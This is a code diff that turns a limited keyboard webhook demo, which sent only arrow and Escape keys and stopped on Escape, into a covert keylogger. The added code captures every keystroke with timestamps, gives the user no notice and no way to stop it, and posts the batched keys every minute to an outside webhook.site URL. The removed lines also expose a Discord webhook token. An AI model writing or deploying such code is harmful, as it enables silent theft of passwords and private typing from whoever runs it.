@@ -1,50 +1,55 @@
-import json
-import urllib.request
-from datetime import datetime
-from pynput.keyboard import Key, Listener
+import requests
+from pynput import keyboard
+import datetime
+import schedule
+import time
 
-WEBHOOK_URL = "https://discord.com/api/webhooks/1553030675525931033/AF3-QESHAxVtCd4e2g9WJX05tEHmBfr4QJU5DGFc38vy_4cpC_Kp8LY8cJxmXq3APAds"
+webhook_url = "https://webhook.site/ae75f21b-355b-4bde-a0b8-d8f3e34def95"
 
-ALLOWED_KEYS = {
-    Key.esc,
-    Key.up,
-    Key.down,
-    Key.left,
-    Key.right,
-}
+keys_with_timestamps = []
 
-def send_demo_event(key):
-    payload = {
-        "event": "keyboard_demo",
-        "key": str(key),
-        "timestamp": datetime.now().isoformat(),
-    }
-
-    data = json.dumps(payload).encode("utf-8")
-
-    request = urllib.request.Request(
-        WEBHOOK_URL,
-        data=data,
-        headers={"Content-Type": "application/json"},
-        method="POST",
-    )
-
+def key_pressed(key):
     try:
-        with urllib.request.urlopen(request, timeout=5) as response:
-            print("Webhook response:", response.status)
+        timestamp = datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S.%f ")
+        if hasattr(key,'char'):
+            keys_with_timestamps.append((str(key.char) , timestamp))
+        elif hasattr(key,'vk'):
+            nashnas=key.name if hasattr(key, "name") else "nemishnasm"
+            keys_with_timestamps.append((" in horof khase :" + nashnas , timestamp))
+        else:
+            pass
+    except Exception as e :
+        print(f"man in moshkel ro dashtam erroram ineh  {e}")
+        
+        
+def send_keys_to_webhook(keys_data):
+    payload = {"keys": keys_data}
+    try:
+        response = requests.post(webhook_url , json=payload)
+        if response.status_code == 200:
+            print(" man etelat ersal kardam  ")
+        else:
+            print(f" man moshkel daram moshkalamma ineh : {response.status_code}")
     except Exception as e:
-        print("Webhook error:", e)
+        print("error ma dar ersal keys : {e}")
 
-def on_press(key):
-    if key in ALLOWED_KEYS:
-        send_demo_event(key)
 
-    if key == Key.esc:
-        return False
-
-print("Safe keyboard webhook demo running.")
-print("Press an arrow key to send a demo event.")
-print("Press Escape to stop.")
-
-with Listener(on_press=on_press) as listener:
+def send_keys_poriodically():
+    if keys_with_timestamps:
+        send_keys_to_webhook(keys_with_timestamps)
+        keys_with_timestamps.clear()
+        
+        
+def start_periodic_sender():
+    schedule.every(1).minute.do(send_keys_poriodically)
+    while True :
+        schedule.run_pending()
+        time.sleep(1)
+        
+        
+with keyboard.Listener(on_press= key_pressed) as listener:
+    start_periodic_sender()
     listener.join()
+        
+        
+
